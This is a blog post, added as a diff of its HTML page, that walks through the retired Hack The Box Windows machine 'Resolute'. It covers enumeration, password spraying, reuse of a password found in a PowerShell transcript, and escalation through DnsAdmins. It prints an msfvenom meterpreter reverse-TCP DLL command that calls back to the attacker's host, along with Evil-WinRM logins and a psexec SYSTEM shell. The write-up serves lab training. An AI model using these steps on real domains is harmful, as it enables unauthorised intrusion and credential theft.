@@ -1,0 +1,433 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB Resolute Write Up | baphzero</title>
+  <meta name="author" content="Rodhnny Acosta">
+  
+  <meta name="description" content="Resolute!A not so old Machine retired just a few days (if you are reading this around 06/02/20).Another Windows OS based machine, Windows machines are my least favorite ones :(  
+But here’s my write up for Resolute!
+Please note for the sake of keeping the post short I’ve trimmed a lot of stuff from my original experience with the machine.
+
+
+ 
+
+Starting off with reaching the box which has IP: 10.10.10.169
+root@kek:~# ping resolute.htb
+PING resolute.htb (10.10.10.169) 56(84) bytes of data.
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=1 ttl=127 time=97.10 ms
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=2 ttl=127 time=126 ms
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=3 ttl=127 time=115 ms
+
+Now off to fire up our nmap scan:
+| root@kek:~/htb/resolute# nmap -sV -sC -sC -T4 Resolute.htb 10.10.10.169
+
+All them ports:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB Resolute Write Up"/>
+  <meta property="og:site_name" content="baphzero"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">baphzero</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB Resolute Write Up</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Resolute"><a href="#Resolute" class="headerlink" title="Resolute!"></a>Resolute!</h1><p>A not so old Machine retired just a few days (if you are reading this around 06/02/20).<br>Another Windows OS based machine, Windows machines are my least favorite ones :(  </p>
+<p>But here’s my write up for Resolute!</p>
+<p>Please note for the sake of keeping the post short I’ve trimmed a lot of stuff from my original experience with the machine.</p>
+</header>
+
+<div class="image main"> <p><img src="/assets/images/resolute.jpg" alt="information"></p></div>
+
+<p>Starting off with reaching the box which has IP: 10.10.10.169</p>
+<pre><code>root@kek:~# ping resolute.htb
+PING resolute.htb (10.10.10.169) 56(84) bytes of data.
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=1 ttl=127 time=97.10 ms
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=2 ttl=127 time=126 ms
+64 bytes from resolute.htb (10.10.10.169): icmp_seq=3 ttl=127 time=115 ms
+</code></pre>
+<p>Now off to fire up our nmap scan:</p>
+<pre><code>| root@kek:~/htb/resolute# nmap -sV -sC -sC -T4 Resolute.htb 10.10.10.169
+</code></pre>
+<p>All them ports:</p>
+<pre><code>Nmap scan report for resolute.htb (10.10.10.169)
+Host is up (0.095s latency).
+Not shown: 989 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain?
+| fingerprint-strings:
+| DNSVersionBindReqTCP:
+| version
+|_ bind
+88/tcp open kerberos-sec Microsoft Windows Kerberos
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+</code></pre>
+<p>Let’s keep gathering more information, lately on windows boxes I like to run the enum4linux.<br>Which is a tool that as it almost says on the name enumerates, this is the linux variant of the .exe tool sort off.. more info <a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/enum4linux">here.</a></p>
+<pre><code>root@kek:~/htb/resolute# enum4linux -a resolute.htb
+==========================
+| Target Information |
+==========================
+Target ……….. resolute.htb
+RID Range …….. 500–550,1000–1050
+Username ……… ‘’
+Password ……… ‘’
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+</code></pre>
+<p>It will load a bunch of information but we’ll focus on this part, also a bunch of user we could scrape.<br>A warm welcome :)</p>
+<div class="image main"> <p><img src="/assets/images/resolute2.jpg" alt="users"></p></div>
+
+<p>So we got this information account marko and descritpion show that the password was set to Welcome123!<br>Ssoooo.. what we have so far, bunch of ports and what it seems a user and possible password and possible domain info megabank.local  </p>
+<p>Let’s use the ol’ windows bestie Evil WinRm with the user and credentials just to find out that it does not work proobs he already changed it. We still have a few users we scraped from the enumeration.</p>
+<p>We could either do a bruteforce or try manually one by one hoping the default password or someone has the same one.<br>We could also automate this “Bruteforcing”,Anyways after a while we could login as Melanie using password “Welcome123!” CoffcoffTriedalluserswiththispasswordcoffcoff.  </p>
+<div class="image main"> <p><img src="/assets/images/resolute3.jpg" alt="evilwinrm"></p></div>
+
+<p>Now we look here and there and will find the user.txt on the Desktop dir:**</p>
+<pre><code>*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; dir -force
+Directory: C:\Users\melanie\Desktop
+Mode LastWriteTime Length Name
+— — — — — — — — — — — — — —
+-ar — — 12/3/2019 7:33 AM 32 user.txt
+*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; type user.txt
+0c3be45fc
+</code></pre>
+<p>**Now onto Root we need to find a way to escalate privileges;<br>So more enumeration, let’s check what kind of privs we have:</p>
+<div class="image main"> <p><img src="/assets/images/resolute4.jpg" alt="privs"></p></div>
+
+<p>Alrightys keeping on looking on what we have access.<br>Navigating through we’ll see a dir called PSTranscripts which is hidden and inside another dir too.</p>
+<div class="image main"> <p><img src="/assets/images/resolute5.jpg" alt="msf config"></p></div>
+
+<p>Inside of this hidden path we’ll find a file called “PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt”<br>Looking at the inside we’ll see indeed a transcript but this has something interesting in it, let’s look it closely.  </p>
+<div class="image main"> <p><img src="/assets/images/resolute6.jpg" alt="password"></p></div>
+
+<p>Looking closely we’ll find this line:</p>
+<pre><code>&gt;&gt; ParameterBinding(Invoke-Expression): name=”Command”; value=”cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+</code></pre>
+<p>Interesting enough we can see two things what looks like a user and password and the \fs01\backups dir.<br>samee thing let’s give a try to the user and password we just found out.</p>
+<pre>**`root@kek:~/htb/resolute# evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!`**</pre>
+
+<div class="image main"> <p><img src="/assets/images/resolute7.jpg" alt="ryan login"></p></div>
+
+<p>Sooo we were able to log in as our Ryan boii.<br>After a few minutes (coffcoffhourscoffcoff) I was able to find a method to escalate, if we take a look a our guy ryan groups we can see he’s part of MEGABANK\DnsAdmins and looking/googling we can learn that we could jump from DNSadmin to DC admin :P  </p>
+<p>Awesome resources:<br><strong><a target="_blank" rel="noopener" href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">Feature, not bug: DNSAdmin to DC compromise in one line</a><br><a target="_blank" rel="noopener" href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">From DnsAdmins to SYSTEM to Domain Compromise</a></strong></p>
+<p>Now, let’s build up the .dll  </p>
+<p>**</p>
+<pre><code>root@kek:~/htb/resolute# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f dll &gt; letmein.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 5120 bytes
+</code></pre>
+<p>**</p>
+<p>And let’s upload that .dll<br>but seems as soon we upload it it will be blown away..</p>
+<p>This time I’ll use another method, PSEXEC with mfsconsole (There was another machine this trick helped in getting root easy peasy);<br>So firing up msf we should have something like this:</p>
+<div class="image main"> <p><img src="/assets/images/resolute8.jpg" alt="msf config"></p></div>
+
+<pre>**`meterpreter > shell
+Process 2116 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+© 2016 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>whoami
+whoami
+nt authority\system` **</pre>
+
+<p>Welp! We have succesfully pwned the machine at this time, just find the root.txt on the \Users\administrator\desktop\ path.  </p>
+<pre><code>Directory of C:\Users\Administrator\Desktop
+12/04/2019 06:18 AM DIR .
+12/04/2019 06:18 AM DIR.
+12/03/2019 08:32 AM 32 root.txt
+1 File(s) 32 bytes
+2 Dir(s) 30,969,835,520 bytes free
+| C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+e1d94876a506
+</code></pre>
+<p>So this time we got another easy root however I am sure there are plenty other ways to root this machine, I faced so many issues with impacket that at the end had to take this PSEXEC route with msfconsole which automates creating payload, loading it up and opening a meterpreter session.</p>
+<p>Once more if you read this, thanks for your time.<br>If you have any question or would like to talk anything related HTB feel free to chime in :)</p>
+<p>Hack the planet and stay safe! x)</p>
+<div class="image">![user](1_8WINeDA9BY08yp2xvoQGIQ.jpg)</div>
+
+</section>
+
+</div>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.
+</div>
+
+	</div>
+
+	
+	<span id="/2021/08/03/HTB-Resolute-Write-Up/" class="leancloud-visitors view" data-flag-title="HTB Resolute Write Up">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/08/05/More-Ransomware-targetting-ESXI-Hosts/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/08/03/HTB-Bastion-Write-Up/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"sss","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "sss",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-08-03 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HackTheBox/">HackTheBox<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 Rodhnny Acosta's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
